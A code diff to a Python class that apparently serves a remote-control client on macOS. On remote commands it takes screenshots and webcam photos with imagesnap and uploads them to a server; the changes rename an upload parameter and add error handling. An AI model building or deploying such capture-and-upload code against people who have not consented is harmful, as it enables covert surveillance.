@@ -37,7 +37,7 @@ class MacMediaService:
             self.owner._send_success('Screenshot captured successfully', 0)
             return self.owner.http_file_transfer_service.upload_single_file_to_server_result(
                 screenshot_path,
-                folder='Screenshots',
+                category='screenshots',
                 upload_name=build_artifact_filename('screenshot', 'png'),
                 extra={'origin': ArtifactOrigin.SCREENSHOT_COMMAND.value},
             )
@@ -69,19 +69,23 @@ class MacMediaService:
             temp_file = temp_path
             self.owner._send_info(f'Client Temp Path: {temp_file}', 0)
 
-            subprocess.run(
+            capture = subprocess.run(
                 ['imagesnap', '-w', '1', temp_file],
                 capture_output=True,
-                timeout=5
+                timeout=5,
             )
+            if capture.returncode != 0:
+                return 0, 'Failed to capture webcam photo'
 
             if os.path.getsize(temp_file) > 0:
-                self.owner.http_file_transfer_service.upload_single_file_to_server_result(
+                status, message = self.owner.http_file_transfer_service.upload_single_file_to_server_result(
                     temp_file,
-                    folder='Webcam',
+                    category='webcam',
                     upload_name=build_artifact_filename('webcam', 'jpg'),
                     extra={'origin': ArtifactOrigin.WEBCAM_COMMAND.value},
                 )
+                if not status:
+                    return 0, f'Webcam upload failed: {message}'
                 file_size = get_size(os.path.getsize(temp_file))
                 return 1, f'Webcam photo captured ({file_size})'
 
